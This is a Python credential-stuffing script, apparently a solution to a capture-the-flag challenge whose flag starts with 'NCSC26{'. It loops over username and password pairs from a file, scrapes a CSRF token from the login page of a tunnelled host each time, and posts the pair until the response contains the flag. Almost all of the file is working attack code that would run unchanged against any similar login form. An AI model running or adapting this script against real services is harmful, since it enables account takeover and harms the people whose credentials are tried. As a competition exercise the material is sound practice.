import re
import requests

BASE_URL = "https://keeping-bookmark-divine-machinery.trycloudflare.com"
LOGIN_URL = f"{BASE_URL}/login"

print("[+] Starting session...")
session = requests.Session()

print("[+] Starting credential stuffing...")
with open("credentials.txt") as f:
    for line in f:
        user, pwd = line.strip().split(",", 1)
        
        # 1. Fetch GET / to receive session cookie and CSRF token
        try:
            get_response = session.get(BASE_URL)
        except requests.exceptions.ConnectionError:
            print("[!] Error: Cannot connect to the server. Make sure Flask app is running.")
            break
            
        # 2. Parse CSRF token using regex
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"|value="([^"]+)"\s+name="csrf_token"', get_response.text, re.DOTALL | re.IGNORECASE)
        if not match:
            # Fallback regex in case of different formatting
            match = re.search(r'csrf_token.*?value="([^"]+)"|value="([^"]+)".*?csrf_token', get_response.text, re.DOTALL | re.IGNORECASE)
        if not match:
            print("[!] Error: CSRF token not found in the HTML form!")
            print(get_response.text[:500]) # Print snippet for debugging if it fails
            break
        
        csrf_token = match.group(1) or match.group(2)
        
        # 3. Post login credentials along with CSRF token
        post_response = session.post(
            LOGIN_URL,
            data={
                "username": user,
                "password": pwd,
                "csrf_token": csrf_token
            }
        )
        
        # Check for success (presence of the Flag prefix)
        if "NCSC26{" in post_response.text:
            print("\n[+] SUCCESS!")
            print(f"Credentials Found: {user} / {pwd}")
            
            # Extract flag from success response
            flag_match = re.search(r'NCSC26\{[^}]+\}', post_response.text)
            if flag_match:
                print(f"Flag: {flag_match.group(0)}")
            else:
                print(post_response.text)
            break
        else:
            print(f"[-] Tried: {user} / {pwd} -> Login Failed")